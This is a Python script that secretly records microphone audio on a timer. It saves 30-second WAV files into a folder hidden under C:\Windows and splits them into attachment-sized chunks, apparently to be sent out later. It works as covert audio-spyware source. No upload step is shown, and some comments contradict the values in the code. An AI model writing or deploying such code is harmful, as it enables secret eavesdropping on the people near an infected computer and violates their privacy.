import logging
import os
import sounddevice as sd
import wave
import math
import threading
from datetime import datetime

# Shared settings
output_directory = "C:\\Windows\\klm\\output"
log_directory = "C:\\Windows\\klm\\logs"
logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
MICROPHONE_DURATION = 30  # Duration of recording, updated to 60 seconds
MAX_ATTACHMENT_SIZE = 5 * 1024 * 1024  # Max size for an attachment

def record_audio():
    try:
        fs = 44100  # Sample rate
        seconds = MICROPHONE_DURATION  # Duration of recording
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        audio_path = os.path.join(output_directory, f"audio_log_{timestamp}.wav")

        logging.info("Starting audio recording...")
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()  # Wait until recording is finished
        logging.info("Audio recording complete.")

        # Save as WAV file
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)  # 2 bytes per sample
            wf.setframerate(fs)
            wf.writeframes(myrecording.tobytes())

        audio_size = os.path.getsize(audio_path)
        logging.info(f"Recorded audio size: {audio_size} bytes")
        if audio_size > MAX_ATTACHMENT_SIZE:
            logging.info("Splitting audio file due to size")
            split_audio_file(audio_path)
        else:
            logging.info(f"Audio file saved to {audio_path}")

    except Exception as e:
        logging.error(f"Failed to record audio: {e}")

def split_audio_file(audio_path):
    chunk_size = MAX_ATTACHMENT_SIZE  # Max size per chunk
    with wave.open(audio_path, 'rb') as wf:
        params = wf.getparams()
        total_frames = wf.getnframes()
        frames_per_chunk = chunk_size // (params.sampwidth * params.nchannels)
        num_chunks = math.ceil(total_frames / frames_per_chunk)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        for i in range(num_chunks):
            chunk_path = os.path.join(output_directory, f"audio_log_{timestamp}_part_{i+1}.wav")
            with wave.open(chunk_path, 'wb') as chunk_wf:
                chunk_wf.setparams(params)
                frames = wf.readframes(frames_per_chunk)
                chunk_wf.writeframes(frames)
            logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
        
    os.remove(audio_path)  # Delete the original file after splitting
    logging.info(f"Deleted original file: {audio_path}")

def schedule_recording():
    record_audio()
    threading.Timer(1800, schedule_recording).start()  # Schedule next recording in 1 hour

if __name__ == "__main__":
    schedule_recording()
